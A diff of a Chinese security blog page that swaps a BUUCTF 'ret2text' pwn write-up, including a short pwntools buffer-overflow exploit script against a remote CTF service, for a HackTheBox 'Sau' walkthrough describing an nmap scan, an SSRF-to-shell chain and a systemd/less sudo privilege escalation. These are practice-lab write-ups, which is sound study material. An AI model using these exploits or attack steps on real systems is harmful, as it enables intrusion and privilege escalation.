@@ -6,7 +6,7 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>PWN-ret2text-2 | Hustler&#39;s Blog</title>
+  <title>OSCP-Sau | Hustler&#39;s Blog</title>
   <meta name="author" content="Hustler">
   
   <meta name="description" content="Everybody needs love,but hacker dont">
@@ -14,7 +14,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="PWN-ret2text-2"/>
+  <meta property="og:title" content="OSCP-Sau"/>
   <meta property="og:site_name" content="Hustler&#39;s Blog"/>
 
   
@@ -109,7 +109,7 @@
 
 	
 		<div class="page-header">
-			<h1> PWN-ret2text-2</h1>
+			<h1> OSCP-Sau</h1>
 		</div>
 	
 
@@ -124,20 +124,10 @@
 	<div class="mypage">		
 	  		
 
-	  <p>来源BUUCTF</p>
-<h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置和类型，发现保护较为薄弱，并且是32位小端序</p>
-<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p><img src="/images/buuctfpwn1/1.JPG"><br>在IDA中查看vuln函数，发现我们只能输入32字节大小的字符（s只有32字节），而覆盖栈需要0x3C个字符，显然是没法溢出的，仔细观察，看到大写I和小写you，经过猜测和测试发现当我们给程序输入一个大写I，程序会将其替换为you，这样我们就可以构造足够的字符来溢出了，下面给出payload：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+	  <h1 id="Sau"><a href="#Sau" class="headerlink" title="Sau"></a>Sau</h1><h2 id="来源：HackTheBox"><a href="#来源：HackTheBox" class="headerlink" title="来源：HackTheBox"></a>来源：HackTheBox</h2><h3 id="难度：Easy"><a href="#难度：Easy" class="headerlink" title="难度：Easy"></a>难度：Easy</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sS</span> -p- <span class="token number">10.10</span>.11.224<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现目标开放了80，22，55555，8338，并且80和8338端口处于过滤状态，猜测他开在127.0.0.1上导致不能直接访问<br>直接访问55555，发现是一个requests baskets的网页组件，测试没有结果，查看其github的issue页面发现之前提过ssrf漏洞的issue：<br><img src="/images/OSCPsau/1.JPG"><br>并且附上了poc地址，尝试利用POC，成功用ssrf漏洞访问到靶机本地的80和8338端口，又是一个新的组件，searchsploit发现有POC，打POC getshell，随后拿一个ttyshell<br>使用sudo  -l 检查sudo配置：<br><img src="/images/OSCPsau/2.JPG"><br>发现可以以root权限运行systemctl，猜测提权漏洞可能与systemctl有关，遂查询版本，在searchsploit中找到相关漏洞：<br><img src="/images/OSCPsau/3.JPG"><br>（systemctl —&gt; systemd）<br>中文解释：<br>漏洞描述<br>Systemd 是一个Linux系统的初始化系统和服务管理器。<br>该项目受影响版本存在权限管理不当漏洞，当Linux中的LESSSECURE未设置为1且sudoers文件对于执行”systemctl status”等命令没有限制时，攻击者则可将终端窗口调小随后执行sudo systemctl ，迫使系统以默认的root权限自动调用”less”命令输出结果，进而实现权限提升<br>解决建议<br>“将组件 Systemd 升级至 247 及以上版本” </p>
+<p>根据漏洞提权即可，经典user.txt和&#x2F;root目录找flag</p>
 
-<span class="token comment">#io=process('./pwn1_sctf_2016')    # 本地打通</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28285</span><span class="token punctuation">)</span>  <span class="token comment"># 远程打通</span>
-
-payload<span class="token operator">=</span><span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">21</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x8048F0E</span><span class="token punctuation">)</span> <span class="token comment"># 需要64个字符来填满，21个I能换63个字符加一个a，后面是后门函数地址</span>
-
-<span class="token comment">#io.recvline()</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 	  <div class="article-footer-copyright">
 
     本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
@@ -156,13 +146,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 
     
     
-    <a href="/2025/01/15/buuctfpwn2/" type="button" class="btn btn-default"><i
+    <a href="/2025/01/16/OSCP-Updown/" type="button" class="btn btn-default"><i
                 class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2025/01/12/OSCP-symfonos5/" type="button" class="btn btn-default ">Next<i
+    <a href="/2025/01/15/OSCP-Busqueda/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -195,7 +185,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2025-01-14 
+	2025-01-16 
 	</div>
 	
 
@@ -206,7 +196,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/竞赛/">竞赛<span>23</span></a></li> <li><a href="/categories/竞赛/CTF/">CTF<span>23</span></a></li> <li><a href="/categories/竞赛/CTF/PWN/">PWN<span>7</span></a></li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>11</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>11</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/">HackTheBox<span>3</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/Easy/">Easy<span>2</span></a></li>
 
 <div class="widget tag">
   <h3 class="title">All Categories</h3>
@@ -224,7 +214,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>23</span></a></li> <li><a href="/tags/PWN/">PWN<span>7</span></a></li> <li><a href="/tags/BUUCTF/">BUUCTF<span>2</span></a></li>
+  <li><a href="/tags/OSCP/">OSCP<span>11</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>11</span></a></li> <li><a href="/tags/HackTheBox/">HackTheBox<span>3</span></a></li>
     </ul>
 	</div>
 		
